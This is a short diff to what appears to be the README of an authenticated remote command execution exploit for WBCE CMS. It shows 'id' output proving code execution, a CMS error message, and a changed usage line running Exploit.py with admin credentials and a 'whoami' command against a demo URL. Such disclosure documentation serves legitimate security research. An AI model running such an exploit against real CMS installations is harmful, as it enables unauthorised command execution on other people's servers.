@@ -78,8 +78,7 @@ uid=1000(soft) gid=1000(soft) groups=1000(soft)
                     <p>Invalid WBCE CMS language file. Please check the text file.</p>    
                     <p><a href="index.php" class="button">Back</a></p>```
 
+
 ### Exploit :
 
-```python3 Exploit.py https://demos6.softaculous.com/WBCE_CMShfwcsysb8z/admin/ admin password 'whoami'
-```
-
+python3 Exploit.py https://demos6.demo.com/admin/ admin password 'whoami'
